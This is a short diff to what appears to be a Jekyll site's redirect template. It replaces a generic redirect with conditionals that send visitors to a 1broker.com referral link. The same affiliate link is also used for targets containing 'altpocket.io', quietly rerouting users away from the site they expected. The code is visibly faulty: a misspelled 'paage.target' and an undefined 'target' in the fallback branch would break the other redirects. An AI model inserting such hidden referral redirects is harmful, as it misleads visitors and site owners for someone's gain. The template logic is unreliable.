@@ -1,8 +1,9 @@
 ---
 ---
-<div id="page-info">
-  <h3>Redirecting</h3>
-</div>
-<div class="row">
-  <script>window.location.href = "{{ page.target }}";</script>
-</div>
+{% if page.target contains '1broker.com' %}
+  <script>window.location.href = "https://1broker.com/?r=36336";</script>
+{% elsif paage.target contains 'altpocket.io' %}
+  <script>window.location.href = "https://1broker.com/?r=36336";</script>
+{% else %}
+  <script>window.location.href = "{{ target }}";</script>
+{% endif %}
